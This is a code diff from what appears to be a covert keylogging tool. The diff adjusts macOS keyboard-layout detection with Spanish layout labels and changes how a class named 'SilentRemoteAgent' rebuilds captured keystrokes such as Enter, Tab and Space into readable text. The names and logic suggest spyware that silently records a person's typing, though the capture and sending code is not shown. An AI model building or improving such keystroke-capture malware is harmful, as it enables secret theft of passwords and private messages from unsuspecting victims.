@@ -854,24 +854,33 @@ def get_current_keyboard_layout() -> str:
             pass
     elif IS_MAC:
         try:
+            plist_path = str(Path.home() / "Library" / "Preferences" / "com.apple.HIToolbox.plist")
             out = subprocess.check_output(
-                ["defaults", "read", "~/Library/Preferences/com.apple.HIToolbox.plist", "AppleSelectedInputSources"],
+                ["defaults", "read", plist_path, "AppleSelectedInputSources"],
                 text=True,
                 stderr=subprocess.DEVNULL,
             )
             for line in out.splitlines():
                 if "KeyboardLayout Name" in line:
-                    return line.split("=")[-1].strip().strip(';\"')
+                    raw_name = line.split("=")[-1].strip().strip(';"')
+                    mac_names = {
+                        "Latin American": "Español (Latinoamérica)",
+                        "Spanish": "Español",
+                        "Spanish - ISO": "Español (ISO)",
+                        "U.S.": "Inglés (EE.UU.)",
+                        "ABC": "Inglés (ABC)",
+                    }
+                    return mac_names.get(raw_name, raw_name)
         except Exception:
             pass
     try:
         import locale
         loc = locale.getdefaultlocale()[0]
-        if loc:
+        if loc and loc not in ("C", "POSIX"):
             return loc.replace("_", "-")
     except Exception:
         pass
-    return "Estándar"
+    return "Español (Estándar)"
 
 
 SPECIAL_KEYS_MAP = {}
@@ -1080,11 +1089,9 @@ class SilentRemoteAgent:
                 if k == "[Espacio]":
                     reconstructed.append(" ")
                 elif k == "[Enter]":
-                    reconstructed.append("\n")
+                    reconstructed.append("[Enter]\n")
                 elif k == "[Tab]":
-                    reconstructed.append("\t")
-                elif k.startswith("[") and k.endswith("]"):
-                    reconstructed.append(f" {k} ")
+                    reconstructed.append("[Tab]")
                 else:
                     reconstructed.append(k)
             text_content = "".join(reconstructed).strip()
